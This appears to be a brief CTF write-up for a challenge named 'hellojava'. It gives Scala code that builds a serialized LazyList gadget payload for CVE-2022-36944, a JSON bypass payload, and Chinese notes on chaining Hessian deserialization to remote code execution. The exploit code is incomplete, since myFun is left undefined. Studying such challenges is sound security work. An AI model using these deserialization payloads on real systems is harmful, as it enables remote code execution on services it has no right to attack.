---
tags: [Java反序列化, Hessian, CVE-2022-36944, 漏洞绕过, RCE]
---

# hellojava

CVE-2022-36944

```
import scala.reflect.runtime.{currentMirror => cm}
import java.io.{ByteArrayInputStream, ByteArrayOutputStream, ObjectInputStream,
ObjectOutputStream}
import java.util.Base64
import scala.reflect.runtime.universe.{TermName, typeOf}

object Main {
def serialize(obj: AnyRef): Array[Byte] = {
val buffer = new ByteArrayOutputStream
val out = new ObjectOutputStream(buffer)
out.writeObject(obj)
buffer.toByteArray
}
def main(args: Array[String]): Unit = {
val u = LazyList.from(10).map(myFun)

val lazyListType = typeOf[LazyList[_]]

val stateEvaluatedField =
lazyListType.member(TermName("scala$collection$immutable$LazyList$stateEvaluated")).asT
erm
val instanceMirror = cm.reflect(u)
val stateEvaluated =
instanceMirror.reflectField(stateEvaluatedField).get.asInstanceOf[Boolean]
if (!stateEvaluated) {
instanceMirror.reflectField(stateEvaluatedField).set(true)
}
println(Base64.getEncoder.encodeToString(serialize(u)))

}}
```

Mybean哪里可以这么绕

```
{"Base64Code":"Eval","":true}
```

调用哪个myFun， myFun可以触发hessian反序列化，很套hessian使用0ctf的JavaWrapper的思路直接就打了